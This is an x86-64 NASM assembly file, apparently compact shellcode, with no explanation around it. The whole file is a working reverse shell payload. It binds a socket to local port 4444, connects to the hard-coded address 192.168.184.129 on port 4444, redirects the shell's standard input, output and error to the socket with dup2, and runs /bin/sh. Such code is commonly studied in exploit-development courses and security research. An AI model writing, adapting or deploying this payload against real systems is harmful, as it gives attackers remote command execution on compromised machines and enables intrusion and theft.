[BITS 64]
global _start

IP       equ 0x81b8a8c0
DPORT    equ 0x5c11
SPORT    equ 0x5c11

SYS_SOCKET  equ 0x29
SYS_BIND    equ 0x31
SYS_CONNECT equ 0x2a
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

AF_INET     equ 0x2
SOCK_STREAM equ 0x1

section .text
_start:
    create_socket:
        xor rdx, rdx
        push SOCK_STREAM
        pop rsi
        push AF_INET
        pop rdi
        push SYS_SOCKET
        pop rax
        cdq
        syscall
 
        push rax
        pop rdi

    struct_sockaddr_bind:
        push rdx
        mov dword [rsp + 0x4], edx
        mov  word [rsp + 0x2], SPORT
        mov  byte [rsp], AF_INET

    bind_socket:
        push 0x10
        pop rdx
        push rsp
        pop rsi
        push SYS_BIND
        pop rax
        syscall
 
    struct_sockaddr_connect:
        mov dword [rsp + 0x4], IP
        mov  word [rsp + 0x2], DPORT

    connect_socket:
        push 0x10
        pop rdx
        push rsp
        pop rsi
        push SYS_CONNECT
        pop rax
        syscall

    dup2_socket:
        push 0x3
        pop rsi

    loop:
        dec esi
        mov al, SYS_DUP2
        syscall

        jne loop

    execve_sh:
        push rsi
        pop rdx
        push rsi
        mov rdi, '/bin//sh'
        push rdi
        push rsp
        pop rdi
        mov al, SYS_EXECVE
        syscall
